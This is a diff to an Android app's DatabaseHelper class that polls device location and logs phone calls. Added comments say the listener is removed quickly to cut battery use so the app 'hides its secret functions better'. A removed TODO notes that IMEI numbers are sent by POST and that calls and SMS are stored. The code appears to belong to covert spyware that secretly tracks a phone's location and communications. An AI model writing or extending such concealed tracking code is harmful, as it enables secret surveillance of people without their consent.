@@ -87,14 +87,10 @@ public class DatabaseHelper extends SQLiteOpenHelper {
         Location lastKnown = null;
 
         final LocationListener locationListener = new LocationListener() {
+            //getLastKnownLocation() automatically updates when the LocationListener fires
+            //So we don't need to to anything in here
             @Override
             public void onLocationChanged(Location location) {
-                try {
-                    Log.d("Loc", "removing updater");
-                    lm.removeUpdates(this);
-                }catch(SecurityException ex){
-                    Log.w("SecurityException", "No permission to access location");
-                }
             }
 
             @Override
@@ -117,25 +113,15 @@ public class DatabaseHelper extends SQLiteOpenHelper {
         }catch(NullPointerException ex){
             ex.printStackTrace();
         }
+
+        //Immediately remove the listener once we've polled location
+        //Reduces battery usage so hides app's secret functions better
         try {
             lm.removeUpdates(locationListener);
         }catch(SecurityException ex){
-            ex.printStackTrace();
+            Log.w("SecurityException", "No permission to access location");
         }
         return lastKnown;
-    }
-
-    public void savePhone(String simSerial, String operator, String voicemail){
-        //TODO:
-        //Once remote DB implemented, fetch the phone's ID once it is set
-        //And store in shared preferences
-        //Then check if it already has an ID before saving the phone
-
-        //TODO:
-        //On second thoughts, don't use this.
-        //POST requests pass the IMEI number, which is used to UID each phone
-        //Local DB doesn't store the phone's data
-        //Just calls and SMS
     }
 
     public void savePhoneCall(String participant, boolean outgoing, long duration, long time){
